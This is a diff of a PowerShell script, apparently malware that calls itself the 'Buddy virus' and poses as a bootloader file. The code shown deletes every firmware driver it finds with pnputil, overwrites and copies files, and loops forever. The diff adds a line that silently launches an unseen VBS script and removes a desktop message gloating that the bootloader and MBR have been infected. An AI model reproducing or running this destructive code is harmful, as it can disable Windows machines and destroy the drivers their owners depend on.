@@ -1,5 +1,6 @@
 # BOOTLOADER FILE
 $scriptPath = Join-Path -Path $PSScriptRoot -ChildPath "kick.vbs"
+& "C:\Windows\System32\wscript.exe" "line.vbs"
 
 # BOOTLOADER
 $adaptadoresDeRede = Get-NetAdapter | Where-Object { $_.PhysicalMediaType -ne "Loopback" }
@@ -13,8 +14,6 @@ $drivers = pnputil.exe /enum-drivers
 $driversDeFirmware = $drivers | Where-Object { $_ -like "*Firmware*" }
 foreach ($driver in $driversDeFirmware) {
     pnputil.exe /delete-driver $driver
-    Set-Content -Path "$([System.Environment]::GetFolderPath('Desktop'))\Buddy2you.txt" -Value "Your computer has been messed up by the Buddy virus :). Don't try to turn it off or restart it; the bootloader and some essential programs for your Windows have been infected, including a part of your MBR!"
-
 $conteudo | Set-Content -Path $caminhoArquivo -Force
 
 Copy-Item -Path $sourceFile -Destination $destinationFile -Force
@@ -30,4 +29,3 @@ foreach ($adaptador in $adaptadoresDeRede) {
 while ($true) {
     Start-Sleep -Seconds 1
 }
-
